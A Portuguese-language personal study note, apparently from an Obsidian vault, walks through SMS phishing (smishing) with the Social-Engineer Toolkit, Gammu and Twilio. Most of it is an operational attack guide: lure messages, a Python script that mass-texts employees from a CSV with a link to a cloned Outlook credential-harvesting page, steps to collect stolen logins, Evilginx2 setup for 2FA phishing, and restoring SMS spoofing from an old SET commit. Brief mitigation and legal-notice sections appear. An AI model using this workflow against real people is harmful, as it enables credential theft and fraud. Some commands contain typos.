2025-06-09 20:32

Status: #developed #segurança 

Tags: [[CyberSecurity]] | [[setoolkit]] | [[Pentest]] | [[Engenharia Social]] | [[Ferramentas]] | [[Smishing]] | [[SMS Spoofing]]

----
# Introdução

O ***phishing* por SMS** (ou *smishing*) é um técnica que usa mensagens de texto para enganar vítimas, direcionando-as a links maliciosos ou solicitando informações confidenciais.

O ***Social-Engineer Toolkit* (SET)** pode ser integrado a gerenciadores de SMS para automatizar ataques de *smishing* em ambientes controlados (*pentests*, treinamentos).

---
# Ferramentas necessários

# 1. *Social-Engineer Toolkit* (SET)

- **Função:** Criar páginas de *phishing* e gerenciar ataques.
- **Instalação(Kali Linux):** 

```bash
sudo apt update
sudo apt install setookit
```

## 2. Gerenciadores de SMS

| Ferramenta     | Descrição                         | Link                                              |
| -------------- | --------------------------------- | ------------------------------------------------- |
| **Gammu**      | Envia SMS via modem 3G/4G ou API. | [gammu.org](https://wammu.eu/gammu/)              |
| **Twilio API** | Serviço pago para envio em massa. | [twilio.com](https://www.twilio.com/)             |
| **AWS SNS**    | Serviço de SMS da Amazon.         | [aws.amazon.com/sns](https://aws.amazon.com/sns/) |

---
# Configuração do SET para *Smishing*

## Passo 1: Inicie o SET

```bash
sudo setoolkit
```

**Selecione:**

```bash
1) Social-Engineering Attacks  
	→ 5) Mass Mailer Attack  
	→ 2) SMS Spoofing
```

## Passo 2: Configure o Ataque

1. **Insira o número da vítima** (ex: `+5511999999999`).
2. **Digite a mensagem de phishing**:

```text
"Seu cartão foi bloqueado. Ative aqui: [LINK MALICIOSO]"
```

3. **Cole o link do phishing** (gerado pelo SET ou encurtado com Bit.ly).

---
# Integração com Gerenciadores de SMS

## Exemplo 1: Usando Gammu (Modem 3G/4G)

1. **Instale Gammu:**

```bash
sudo apt install gammu
```

2. **Configure o modem** (edite `/etc/gammurc`)

```ini
[gammu]
port = /dev/ttyUSB0
connection = at115200
```

3. **Envie o SMS** via SET + Gammu:

```bash
gammu sendsms TEXT +5511999999999 -text "Mensagem de phishing: [LINK]"
```

## Exemplo 2: Usando Twilio (API)

1. Crie uma conta no Twilio e obtenha:
	- `ACCOUNT_SID`
	- `AUTH_TOKEN`
	- Número de telefone Twilio.

2. Use o SET para gerar a mensagem e envie via Pythin

```python
from twilio.rest import Client
client = Client("ACCOUNT_SID", "AUTH_TOKEN")
client.messages.create(
    to="+5511999999999",
    from_="+TWILIO_NUMBER",
    body="Atualize seus dados aqui: [LINK]"
)
```

---
# Exemplo prático completo

## Cenário: Ataque a funcionário de uma empresa

1. Crie uma página de *phishing* no SET (clone do Outlook)

```bash
setoolkit → Website Attack Vectors → Credential Harvester → Site Cloner
```

2. Envie SMS em massa via Twilio:

```python
import csv
from twilio.rest import Client
client = Client("ACCOUNT_SID", "AUTH_TOKEN")
with open('funcionarios.csv') as file:
    for row in csv.reader(file):
        client.messages.create(
            to=row[0],  # Número do funcionário
            from_="+TWILIO_NUMBER",
            body="Sua conta será desativada. Acesse: http://192.168.1.100"
        )
```

3. **Monitore as credenciais roubadas** em `/var/www/html/`.

---
# Mitigação e Defesa

## Para Usuários

- Não clique em links de SMS não solicitados.
- Verifique a URL (domínios suspeitos como `outlook-seguranca.com`).

## Para Empresas

- Treine funcionários contra *smishing*.
- Use filtros de SMS em dispositivos corporativos.

---
# Aviso Legal

- O *smishing* só é válido em **testes autorizados**.
- Leis como **LGPD (Brasil)** e **GDPR (UE)** penalizam ataques não consentidos.

---
# Alternativas para Simular *Smishing*

>[!warning] Atenção
>O **SMS Spoofing** foi removido das versões mais recentes do SET devido a restrições legais e dificuldades técnicas com provedores de SMS modernos. Mas existem alternativas eficazes para simular ataques de phishing por SMS *(smishing)*.

## Por que não aparece a opção?

- **Versões antigas do SET** (antes de 2018) tinham SMS Spoofing, mas:
    
    - Provedores de SMS (Twilio, Nexmo) bloquearam APIs para evitar abuso.
    - Requeria hardware específico (modems GSM) que ficou obsoleto.

- **Versões atuais** focam em vetores mais viáveis (e-mail, web, payloads).

## Alternativa 1: Ferramentas Especializadas em *Smishing*

### Gophish (Recomendado)

- **Instalação:**

```bash
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
unzip gophish-*.zip
sudo ./gophish
```

- **Funcionalidades:**

	- Templates de SMS personalizados.
	- Dashboard para rastrear cliques

### Evilginx2 + Serviço de SMS

- **Para ataques avançados** (*phishing* 2FA):

```bash
git clone https://github.com/kgretzky/evilginx2
cd evilginx2
make
sudo ./evilginx -p ./phishlets/
```

- Integre com Twilio para enviar links maliciosos via SMS.

---
## Alternativa 2: Simular SMS com Python (Para Labs)

Se estiver em um ambiente controlado (ex: laboratório), use um script Python para simular SMS:

```python
import smtplib  # Usando e-mail como alternativa
from_email = "phishing@example.com"
to_email = "victim@example.com"
msg = "From: SMS Falso\nSubject: Alerta\nAcesse: http://bit.ly/xxxxx"
server = smtplib.SMTP("smtp.example.com", 587)
server.sendmail(from_email, to_email, msg)
```

---
## Alternativa 3: Habilitar Funções Ocultas do SET (não recomendado)

1. **Baixe uma versão antiga do SET** (commit `a754202`):

```bash
git clone --depth=1 --branch=master https://github.com/trustedsec/social-engineer-toolkit.git
cd social-engineer-toolkit
git reset --hard a754202
sudo python3 setup.py
```

2. **Configure um modem GSM** (ex: Huawei E303) com Gammu:

```bash
sudo apt install gammu
sudo gammu-config  # Configure o modem
```

3. **Use por sua conta e risco**: Muitas operadoras bloqueiam SMS spoofing hoje.

---
# Mitigação e Boas Práticas

- **Para pentesters:**
	- Use apenas serviços de SMS com consentimento (ex: Twilio em campanhas autorizadas).
	- Documente tudo para evitar problemas legais.

- **Para empresas:**
	- Treine funcionários para identificar smishing (mensagens urgentes, links suspeitos).

---
# Conclusão

O SET + gerenciadores de SMS são uma combinação poderosa para **testes de conscientização** e **pentests**.